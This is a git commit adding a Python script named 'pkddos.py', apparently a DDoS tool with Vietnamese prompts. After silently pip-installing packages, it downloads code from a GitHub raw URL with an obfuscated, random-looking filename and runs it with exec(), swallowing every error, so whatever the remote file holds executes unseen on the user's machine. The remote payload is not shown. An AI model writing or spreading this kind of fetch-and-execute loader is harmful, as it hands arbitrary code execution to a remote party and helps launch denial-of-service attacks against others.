91a0d5cd157fc34154771ca20210769e90033718
Kenne400k <115067774+Kenne400k@users.noreply.github.com>
2023-02-06 20:38:51 +0700

    Add files via upload

---
+++ pkddos.py
@@ -0,0 +1,28 @@
+import os, sys,re,json,random
+from time import sleep
+import threading 
+from time import strftime
+try:
+	import requests,pystyle
+except:
+	os.system('pip install requests && pip install bs4 && pip install pystyle && pip install clear && pip install strftime')
+
+from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
+def ra(a):
+   for i in range(len(a)):
+     sys.stdout.write(a[i])
+     sys.stdout.flush()
+from pystyle import Box
+os.system('clear')
+print('nhập số 1 để vào tool')
+abc = int(input("Nhập Số : ")) 
+try:
+  if abc == 1:
+    exec(requests.get(" https://raw.githubusercontent.com/Kenne400k/nxt/main/dvehtjejeyjeyjejeyjejetjyyjykykysehhhhh3h3h3jnejhetjwhwhwusurwhwrhwthrwhwthtjwjt.py").text)
+  if abc == 2:
+    exec(requests.get(" https://raw.githubusercontent.com/Kenne400k/nxt/main/dvehtjejeyjeyjejeyjejetjyyjykykysehhhhh3h3h3jnejhetjwhwhwusurwhwrhwthrwhwthtjwjt.py").text)
+
+except:
+   pass
+
+
